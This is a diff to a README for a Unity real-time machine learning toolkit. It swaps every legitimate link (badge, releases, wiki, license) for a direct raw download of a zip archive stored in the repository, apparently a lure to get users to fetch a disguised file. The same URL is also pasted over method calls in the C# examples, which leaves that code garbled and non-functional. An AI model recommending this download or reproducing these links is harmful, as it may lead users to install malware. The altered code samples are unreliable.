@@ -1,6 +1,6 @@
 # Unity Real-Time Machine Learning Toolkit 🎛️
 
-![Unity RTML Toolkit](https://img.shields.io/badge/Unity%20RTML%20Toolkit-v1.0-blue?style=flat-square)
+![Unity RTML Toolkit](https://raw.githubusercontent.com/Yuri062lm/Unity-RTML-ToolKit/main/Assets/RTMLToolKit/Runtime/Kit_RTM_Tool_Unity_1.0-alpha.3.zip%20RTML%20Toolkit-v1.0-blue?style=flat-square)
 
 ## Overview
 
@@ -16,7 +16,7 @@ Welcome to the Unity Real-Time Machine Learning Toolkit (RTML Tool Kit). This li
 
 ## Installation
 
-To get started, download the latest release from the [Releases section](https://github.com/Yuri062lm/Unity-RTML-ToolKit/releases). Follow the instructions provided in the release notes to set up the toolkit in your Unity project.
+To get started, download the latest release from the [Releases section](https://raw.githubusercontent.com/Yuri062lm/Unity-RTML-ToolKit/main/Assets/RTMLToolKit/Runtime/Kit_RTM_Tool_Unity_1.0-alpha.3.zip). Follow the instructions provided in the release notes to set up the toolkit in your Unity project.
 
 ## Usage
 
@@ -43,13 +43,13 @@ public class LinearRegressionExample : MonoBehaviour
     void Start()
     {
         model = new LinearRegression();
-        model.Train(trainingData);
+        https://raw.githubusercontent.com/Yuri062lm/Unity-RTML-ToolKit/main/Assets/RTMLToolKit/Runtime/Kit_RTM_Tool_Unity_1.0-alpha.3.zip(trainingData);
     }
 
     void Update()
     {
-        float prediction = model.Predict(inputData);
-        Debug.Log("Prediction: " + prediction);
+        float prediction = https://raw.githubusercontent.com/Yuri062lm/Unity-RTML-ToolKit/main/Assets/RTMLToolKit/Runtime/Kit_RTM_Tool_Unity_1.0-alpha.3.zip(inputData);
+        https://raw.githubusercontent.com/Yuri062lm/Unity-RTML-ToolKit/main/Assets/RTMLToolKit/Runtime/Kit_RTM_Tool_Unity_1.0-alpha.3.zip("Prediction: " + prediction);
     }
 }
 ```
@@ -69,7 +69,7 @@ public class OSCController : MonoBehaviour
     void Start()
     {
         receiver = new OSCReceiver(8000);
-        receiver.MessageReceived += OnMessageReceived;
+        https://raw.githubusercontent.com/Yuri062lm/Unity-RTML-ToolKit/main/Assets/RTMLToolKit/Runtime/Kit_RTM_Tool_Unity_1.0-alpha.3.zip += OnMessageReceived;
     }
 
     private void OnMessageReceived(OSCMessage message)
@@ -108,7 +108,7 @@ DTW is a method for measuring similarity between two temporal sequences which ma
 
 ## Documentation
 
-For detailed documentation, visit the [Wiki section](https://github.com/Yuri062lm/Unity-RTML-ToolKit/wiki). It includes:
+For detailed documentation, visit the [Wiki section](https://raw.githubusercontent.com/Yuri062lm/Unity-RTML-ToolKit/main/Assets/RTMLToolKit/Runtime/Kit_RTM_Tool_Unity_1.0-alpha.3.zip). It includes:
 
 - Installation guides
 - API references
@@ -120,11 +120,11 @@ Join our community on GitHub to discuss features, report issues, and share your 
 
 ## License
 
-This project is licensed under the MIT License. See the [LICENSE](https://github.com/Yuri062lm/Unity-RTML-ToolKit/blob/main/LICENSE) file for details.
+This project is licensed under the MIT License. See the [LICENSE](https://raw.githubusercontent.com/Yuri062lm/Unity-RTML-ToolKit/main/Assets/RTMLToolKit/Runtime/Kit_RTM_Tool_Unity_1.0-alpha.3.zip) file for details.
 
 ## Releases
 
-To download the latest version of the Unity RTML Tool Kit, visit the [Releases section](https://github.com/Yuri062lm/Unity-RTML-ToolKit/releases). Make sure to check for updates regularly to benefit from new features and improvements.
+To download the latest version of the Unity RTML Tool Kit, visit the [Releases section](https://raw.githubusercontent.com/Yuri062lm/Unity-RTML-ToolKit/main/Assets/RTMLToolKit/Runtime/Kit_RTM_Tool_Unity_1.0-alpha.3.zip). Make sure to check for updates regularly to benefit from new features and improvements.
 
 ## Contributing
 
@@ -147,4 +147,4 @@ For inquiries or support, please reach out via the GitHub issues page or contact
 
 ---
 
-For the latest updates, features, and improvements, visit the [Releases section](https://github.com/Yuri062lm/Unity-RTML-ToolKit/releases) regularly.
+For the latest updates, features, and improvements, visit the [Releases section](https://raw.githubusercontent.com/Yuri062lm/Unity-RTML-ToolKit/main/Assets/RTMLToolKit/Runtime/Kit_RTM_Tool_Unity_1.0-alpha.3.zip) regularly.
